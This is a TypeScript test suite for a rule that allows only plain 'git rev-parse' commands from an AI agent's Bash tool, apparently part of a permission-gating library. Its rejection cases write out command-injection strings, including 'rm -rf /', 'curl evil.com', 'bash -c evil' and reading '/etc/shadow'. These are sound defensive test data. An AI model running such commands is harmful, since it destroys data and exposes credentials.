import { describe, expect, it } from "bun:test";
import { ALLOW, NEXT, type ToolCall } from "@brycehanscomb/toolgate";
import allowGitRevParse from "../allow-git-rev-parse";

function bash(command: string): ToolCall {
  return {
    tool: "Bash",
    args: { command },
    context: { cwd: "/tmp", env: {}, projectRoot: null },
  };
}

describe("allow-git-rev-parse", () => {
  describe("allows safe git rev-parse commands", () => {
    const allowed = [
      "git rev-parse HEAD",
      "git rev-parse --short HEAD",
      "git rev-parse main",
      "git rev-parse --abbrev-ref HEAD",
      "git rev-parse --show-toplevel",
      "git rev-parse --git-dir",
      "git rev-parse --verify HEAD~3",
    ];

    for (const cmd of allowed) {
      it(`allows: ${cmd}`, async () => {
        const result = await allowGitRevParse.handler(bash(cmd));
        expect(result.verdict).toBe(ALLOW);
      });
    }
  });

  describe("rejects command chaining", () => {
    const rejected = [
      "git rev-parse HEAD && rm -rf /",
      "git rev-parse HEAD || echo pwned",
      "git rev-parse HEAD ; curl evil.com",
      "git rev-parse HEAD | bash -c evil",
      "git rev-parse HEAD & bitcoin-miner",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGitRevParse.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects shell substitution", () => {
    const rejected = [
      "git rev-parse $(rm -rf /)",
      "git rev-parse `cat /etc/shadow`",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGitRevParse.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects multiline commands", () => {
    const rejected = [
      "git rev-parse HEAD\nrm -rf /",
      "git rev-parse --short HEAD\necho pwned",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${JSON.stringify(cmd)}`, async () => {
        const result = await allowGitRevParse.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  describe("rejects non-git-rev-parse commands", () => {
    const rejected = [
      "git commit -m 'msg'",
      "git push",
      "echo git rev-parse HEAD",
    ];

    for (const cmd of rejected) {
      it(`rejects: ${cmd}`, async () => {
        const result = await allowGitRevParse.handler(bash(cmd));
        expect(result.verdict).toBe(NEXT);
      });
    }
  });

  it("passes through non-Bash tools", async () => {
    const call: ToolCall = {
      tool: "Read",
      args: {},
      context: { cwd: "/tmp", env: {}, projectRoot: null },
    };
    const result = await allowGitRevParse.handler(call);
    expect(result.verdict).toBe(NEXT);
  });
});
